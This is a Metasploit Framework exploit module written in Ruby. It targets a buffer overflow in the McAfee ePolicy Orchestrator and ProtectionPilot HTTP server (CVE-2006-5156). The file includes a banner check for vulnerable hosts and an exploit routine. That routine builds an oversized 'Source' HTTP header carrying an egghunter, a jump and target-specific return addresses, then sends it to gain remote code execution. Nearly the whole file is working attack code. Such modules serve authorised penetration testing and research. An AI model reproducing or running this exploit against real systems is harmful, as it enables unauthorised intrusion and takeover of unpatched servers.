##
# $Id: mcafee_epolicy_source.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##



class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Egghunter

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'McAfee ePolicy Orchestrator / ProtectionPilot Overflow',
			'Description'    => %q{
					This is an exploit for the McAfee HTTP Server (NAISERV.exe).
				McAfee ePolicy Orchestrator 2.5.1 <= 3.5.0 and ProtectionPilot 1.1.0 are
				known to be vulnerable. By sending a large 'Source' header, the stack can
				be overwritten. This module is based on the exploit by xbxice and muts.
				Due to size constraints, this module uses the Egghunter technique.
			},
			'Author'  =>
				[
					'muts <muts [at] remote-exploit.org>',
					'xbxice[at]yahoo.com',
					'hdm',
					'patrick' # MSF3 rewrite, ePO v2.5.1 target
				],
			'Arch'		=> [ ARCH_X86 ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision: 10394 $',
			'References'	=>
				[
					[ 'CVE', '2006-5156' ],
					[ 'OSVDB', '29421 ' ],
					[ 'URL', 'http://www.milw0rm.com/exploits/2467' ],
					[ 'URL', 'http://www.remote-exploit.org/advisories/mcafee-epo.pdf' ],
					[ 'BID', '20288' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars'  => "\x00\x09\x0a\x0b\x0d\x20\x26\x2b\x3d\x25\x8c\x3c\xff",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'ePo 2.5.1 (Service Pack 1)',		{ 'Ret' => 0x600741b5 } ], # p/p/r nahttp32.dll 2.5.1.213
					[ 'ePo 3.5.0/ProtectionPilot 1.1.0',	{ 'Ret' => 0x601EDBDA } ], # p/p/r xmlutil.dll
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Jul 17 2006'))

		register_options(
			[
				Opt::RPORT(81),
			], self.class)
	end

	def check
		connect

		req = "GET /SITEINFO.INI HTTP/1.0\r\n"
		req << "User-Agent: Mozilla/5.0\r\n"
		sock.put(req + "\r\n\r\n")

		banner = sock.get(-1,3)

		if (banner =~ /Spipe\/1.0/)
			return Exploit::CheckCode::Appears
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		egg    = hunter[1]

		sploit  = Rex::Text::rand_text_alphanumeric(92)
		sploit << Rex::Arch::X86.jmp_short(6)
		sploit << Rex::Text::rand_text_alphanumeric(2)
		sploit << [target['Ret']].pack('V')
		sploit << hunter[0]

		content = egg

		request = "GET /spipe/pkg HTTP/1.0\r\n"
		request << "User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0\r\n"
		request << "Content-Length: " + content.length.to_s + "\r\n"
		request << "AgentGuid=" + Rex::Text::rand_text_alphanumeric(64) + "\r\n"
		request << "Source=" + sploit + "\r\n"
		request << "\r\n"
		request << content

		sock.put(request + "\r\n\r\n")

		disconnect
		handler
	end

end

